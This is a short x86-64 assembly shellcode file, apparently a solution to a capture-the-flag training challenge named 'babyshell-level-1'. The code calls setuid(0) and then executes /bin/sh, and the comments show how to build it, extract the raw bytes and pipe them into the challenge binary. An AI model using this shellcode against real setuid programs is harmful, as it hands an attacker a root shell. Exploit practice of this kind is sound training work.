.global _start
_start:
        mov rax, 0x69
        mov rdi, 0
        syscall

        mov rax, 59
        lea rdi, [rip+binsh]
        mov rsi, 0
        mov rdx, 0
        syscall
binsh:
        .string "/bin/sh"

; gcc -nostdlib ./shellcode1.s -o ./shellcode1
; objcopy --dump-section .text=shellcode1 shellcode1
; (cat shellcode1; cat) | /challenge/babyshell-level-1
